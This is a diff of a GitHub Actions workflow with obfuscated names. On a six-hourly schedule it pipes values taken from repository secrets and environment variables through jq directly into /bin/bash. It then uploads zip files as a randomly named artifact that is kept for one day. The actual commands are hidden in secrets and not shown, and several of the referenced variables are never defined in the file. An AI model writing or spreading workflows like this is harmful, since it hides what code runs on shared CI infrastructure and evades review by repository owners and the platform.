@@ -1,19 +1,26 @@
 name: sharonblown9593
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '41 0/6 * * *'
+    - cron: '10 5,11,17,23 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: sharonblown9593
         env:
-          x85: ${{ secrets.x85 }}
+          rjar79: ${{ secrets.rjar79 }}
         run: |
-          echo $x85 | jq -r .jhxab42155 | /bin/bash
-          echo $g7 | jq -r .czwnc0 | /bin/bash
+          printf '%s' "$rjar79" | jq -r .nskul0 | /bin/bash
+          echo $fx4 | jq -r .u29 | /bin/bash
+          printf '%s' "$uyqx07989" | jq -r .okev0679 | /bin/bash
+          echo $ronlf61 | jq -r .v4482 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: epwHg6AB
+          path: "*.zip"
+          retention-days: 1
